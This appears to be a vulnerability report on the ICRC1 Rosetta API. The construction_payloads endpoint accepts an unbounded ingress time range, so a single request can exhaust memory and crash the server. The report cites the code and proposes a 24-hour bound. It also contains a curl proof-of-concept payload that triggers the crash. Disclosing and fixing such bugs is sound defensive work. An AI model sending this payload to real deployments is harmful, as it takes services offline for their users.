### Title
Unbounded `ingress_expiries` Vec allocation via attacker-controlled `ingress_start`/`ingress_end` in `construction_payloads` — (`rs/rosetta-api/icrc1/src/construction_api/services.rs`)

---

### Summary

The `construction_payloads` service function accepts user-supplied `ingress_start` and `ingress_end` as raw `u64` nanosecond timestamps. The only guards before the allocation loop are an ordering check and a minimum-end check. Neither bounds the *range* `(ingress_end - ingress_start)`. An unauthenticated HTTP client can supply `ingress_start=0` and `ingress_end=u64::MAX`, causing the while loop to execute ~153 million iterations and allocate ~1.23 GB on the heap, crashing the Rosetta process.

---

### Finding Description

`construction_payloads` computes two constants:

- `ingress_interval` = `(MAX_INGRESS_TTL − PERMITTED_DRIFT).as_nanos()` = `(300s − 60s) × 10⁹` = **240,000,000,000 ns**
- Step per iteration = `ingress_interval − INGRESS_INTERVAL_OVERLAP.as_nanos()` = `240×10⁹ − 120×10⁹` = **120,000,000,000 ns** [1](#0-0) [2](#0-1) 

The two guards before the loop are:

```rust
if ingress_start >= ingress_end { return Err(...) }          // line 148
if ingress_end < now + ingress_interval { return Err(...) }  // line 154
``` [3](#0-2) 

With `ingress_start = 0` and `ingress_end = u64::MAX`:
- Guard 1: `0 < u64::MAX` → **passes**
- Guard 2: `u64::MAX (≈1.84×10¹⁹) < now (≈1.7×10¹⁸) + 2.4×10¹¹` → **passes** (u64::MAX is far larger)

The loop then runs:

```rust
while ingress_start < ingress_end {
    ingress_expiries.push(ingress_start + ingress_interval);
    ingress_start += ingress_interval.saturating_sub(INGRESS_INTERVAL_OVERLAP.as_nanos() as u64);
}
``` [4](#0-3) 

Iterations = `u64::MAX / 120,000,000,000 ≈ 153,722,867` (~153 million). Each iteration pushes a `u64` (8 bytes), totalling **≈1.23 GB** of heap allocation from a single request. The process OOMs before the loop completes.

The HTTP endpoint is fully unauthenticated — it accepts any JSON POST with a valid `network_identifier`: [5](#0-4) 

`ingress_start` and `ingress_end` are plain `Option<u64>` fields with no range validation at the deserialization layer: [6](#0-5) 

---

### Impact Explanation

A single HTTP POST to `/construction/payloads` with a crafted metadata payload causes the Rosetta server process to exhaust heap memory and crash (OOM kill or panic). Because ICRC1 Rosetta runs as a single process with no redundancy, this takes the entire Rosetta API offline. No authentication, no rate-limit bypass, and no volumetric traffic is required — one request suffices.

---

### Likelihood Explanation

The endpoint is publicly reachable on any deployed ICRC1 Rosetta instance. The exploit requires only knowledge of the Rosetta API spec and the ability to craft a JSON body. The `ingress_start`/`ingress_end` fields are documented in the metadata struct. Likelihood is **high**.

---

### Recommendation

Add an explicit upper bound on the computed range before entering the loop:

```rust
const MAX_INGRESS_WINDOW_NS: u64 = 24 * 3600 * 1_000_000_000; // 24 hours in ns

if ingress_end.saturating_sub(ingress_start) > MAX_INGRESS_WINDOW_NS {
    return Err(Error::processing_construction_failed(
        "Ingress window exceeds maximum allowed duration of 24 hours"
    ));
}
```

This caps `ingress_expiries` to at most `24h / 120s = 720` entries, matching the documented intent in the type comment ("Must be within 24 hours from created_at_time"). [7](#0-6) 

---

### Proof of Concept

```bash
curl -X POST http://<rosetta-host>:8082/construction/payloads \
  -H 'Content-Type: application/json' \
  -d '{
    "network_identifier": {"blockchain":"Internet Computer","network":"<network_id>"},
    "operations": [/* valid transfer ops */],
    "public_keys": [/* valid pubkey */],
    "metadata": {
      "ingress_start": 0,
      "ingress_end": 18446744073709551615
    }
  }'
# Expected: Rosetta process OOMs and crashes before responding.
```

### Citations

**File:** rs/limits/src/lib.rs (L17-21)
```rust
pub const MAX_INGRESS_TTL: Duration = Duration::from_secs(5 * 60); // 5 minutes

/// Duration subtracted from `MAX_INGRESS_TTL` by
/// `expiry_time_from_now()` when creating an ingress message.
pub const PERMITTED_DRIFT: Duration = Duration::from_secs(60);
```

**File:** rs/rosetta-api/icrc1/src/common/constants.rs (L19-19)
```rust
pub const INGRESS_INTERVAL_OVERLAP: Duration = Duration::from_secs(120);
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L148-158)
```rust
    if ingress_start >= ingress_end {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress start should start before ingress end: Start: {ingress_start}, End: {ingress_end}"
        )));
    }

    if ingress_end < now + ingress_interval {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress end should be at least one interval from the current time: Current time: {now}, End: {ingress_end}"
        )));
    }
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L163-167)
```rust
    while ingress_start < ingress_end {
        ingress_expiries.push(ingress_start + ingress_interval);
        ingress_start +=
            ingress_interval.saturating_sub(INGRESS_INTERVAL_OVERLAP.as_nanos() as u64);
    }
```

**File:** rs/rosetta-api/icrc1/src/construction_api/endpoints.rs (L90-107)
```rust
pub async fn construction_payloads(
    State(state): State<Arc<MultiTokenAppState>>,
    Json(request): Json<ConstructionPayloadsRequest>,
) -> Result<Json<ConstructionPayloadsResponse>> {
    let state = get_state_from_network_id(&request.network_identifier, &state)
        .map_err(|err| Error::invalid_network_id(&err))?;
    Ok(Json(services::construction_payloads(
        request.operations,
        request
            .metadata
            .as_ref()
            .map(|m| ConstructionPayloadsRequestMetadata::try_from(m.clone()))
            .transpose()?,
        &state.icrc1_agent.ledger_canister_id,
        request.public_keys.unwrap_or_else(Vec::new),
        SystemTime::now(),
    )?))
}
```

**File:** rs/rosetta-api/icrc1/src/construction_api/types.rs (L179-201)
```rust
#[derive(Clone, Eq, PartialEq, Debug, Default, Deserialize, Serialize)]
pub struct ConstructionPayloadsRequestMetadata {
    /// The memo to use for a ledger transfer.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub memo: Option<Vec<u8>>,

    /// The earliest acceptable expiry date for a ledger transfer.
    /// Must be within 24 hours from created_at_time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ingress_start: Option<u64>,

    /// The latest acceptable expiry date for a ledger transfer.
    /// Must be within 24 hours from created_at_time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ingress_end: Option<u64>,

    /// If present, overrides ledger transaction creation time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub created_at_time: Option<u64>,
}
```
